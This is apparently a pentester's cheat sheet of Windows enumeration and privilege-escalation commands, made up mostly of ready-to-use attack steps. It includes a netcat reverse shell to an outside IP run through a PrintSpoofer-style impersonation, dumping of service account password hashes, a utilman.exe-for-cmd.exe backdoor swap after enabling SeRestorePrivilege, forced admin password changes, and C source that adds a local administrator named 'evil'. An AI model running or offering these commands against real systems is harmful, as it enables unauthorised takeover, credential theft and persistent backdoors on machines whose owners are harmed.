#!/usr/bin/peno

#Getting the version and architecture of the running operating system
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

#Querying the AlwaysInstalledElevated registry values on Windows
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer


#Getting OS Architecture using wmic
wmic os get osarchitecture

#Checking the Group Integrity Level
whoami /groups

#Attempting to change the password
net user admin Ev!lpass

#Using powershell to spawn a cmd.exe process with high integrity
powershell.exe Start-Process cmd.exe -Verb runAs

#Listing driver versions on Windows
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}

#Listing loaded drivers on Windows
PS > driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path

#Listing all drives available to mount on Windows
mountvol

#Checking for reboot and other privileges
whoami /priv

#Rebooting the machine
shutdown /r /t 0

#To retrieve service accounts hash, we'll use a publicly available tool GMSAPasswordReader
*Evil-WinRM* PS C:\Users\enox\Desktop> upload GMSAPasswordReader.exe
*Evil-WinRM* PS C:\Users\enox\Desktop> ./GMSAPasswordReader.exe --accountname svc_apache

#Listing all installed drivers
driverquery /v

#Listing all writable files and directories in a specified target using PowerShell
PS > Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

#Listing all writable files and directories in a specified target
accesschk.exe -uws "Everyone" "C:\Program Files"

#Listing all installed security patches on Windows
wmic qfe get Caption, Description, HotFixID, InstalledOn

#Listing all installed applications installed on Windows
wmic product get name, version, vendor
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

#Getting services via wmic that are automatically started and non-standard
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"

#Listing running services on Windows using PowerShell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

#Listing all the scheduled tasks on Windows
schtasks /query /fo LIST /v

# icacls output for the ServiioService.exe service
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

#Listing all the firewall rules on Windows
netsh advfirewall firewall show rule name=all

#Listing the current profile for the firewall on Windows
netsh advfirewall show currentprofile

#Listing all active network connections on the Windows operating system
netstat -ano

#Printing the routes on Windows
route print

#Listing the full TCP/IP configuration on all available adapters on Windows
ipconfig /all

#Getting a list of running processes on the operating system and matching services
tasklist /SVC

#Checking user permissions
#PrintSpoofer v0.1 or Juicy Potato to get the root shell
whoami /priv
Output: SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
.\PS.exe -i -c ".\nc.exe 192.168.119.156 80 -e cmd" --> shell


#Tools
#https://github.com/pentestmonkey/windows-privesc-check
windows-privesc-check2.exe -h
windows-privesc-check2.exe --dump -G

#Tools
#Checking the application manifest of fodhelper.exe using sigcheck.exe
SysinternalsSuite --> sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe

#Specific exploits:
#whoami /priv
#SeRestorePrivilege            Restore files and directories  Enabled
wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> upload EnableSeRestorePrivilege.ps1
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./EnableSeRestorePrivilege.ps1
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
$ rdesktop 192.168.120.91--> WIN+U


#Tools
#gcc for windows with
mingw-w64.bat
gcc --help


#Code
#adduser.c code
#i686-w64-mingw32-gcc adduser.c -o adduser.exe

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}

#Code
#Ping sweep internal network
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.


#Links:
#XP
C:\Documents and Settings\Administrator\Desktop\

